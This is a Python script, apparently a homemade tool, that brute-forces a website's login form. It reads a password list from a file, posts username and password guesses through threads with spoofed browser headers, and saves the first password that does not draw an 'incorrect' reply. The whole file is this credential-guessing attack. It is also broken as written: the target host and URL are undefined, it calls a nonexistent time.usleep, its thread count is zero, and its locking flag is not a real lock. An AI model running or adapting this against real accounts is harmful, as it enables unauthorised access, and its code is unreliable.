import requests
import sys
import os
import _thread
import time

passwd_file = "result2.txt"
user = "username"
nb_proc = 00

headers = {'Host': HOST, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 Gecko/20100101 Firefox/82.0' }
g_size = 0
g_i = 0
g_lock = False
g_finished = False
g_passwds = []


def init():
    global g_passwds
    global g_size
    global s

    s = requests.session()
    s.cookies.clear()

    f = open(passwd_file, "r")    

    for passwd in f:
        g_passwds.append(passwd)
        g_size += 1
    
    for i in range(nb_proc):
        _thread.start_new_thread(crack, ())



def crack():
    global g_i
    global g_size
    global g_finished
    global g_passwds
    global g_lock
    global s

    while g_i < g_size and g_finished == False:
        
        while g_lock == True:
            time.usleep(1)
        g_lock = True;
        passwd = g_passwds[g_i].rstrip("\n")
        g_i += 1
        i = g_i
        g_lock = False

        payload = {'UserName': user, 'Password': passwd, 'RememberMe': 'False' }
        r = s.post(URL, data=payload, headers=headers)
        if g_finished == False:
            print(str(r.status_code) + " " +  passwd + " " + str(i))
        
        if "incorrect" not in r.text:
            print("FOUND IT = " + passwd)
            f = open("passwd.txt", "w")
            f.write(passwd)
            g_finished = True


init()
crack()
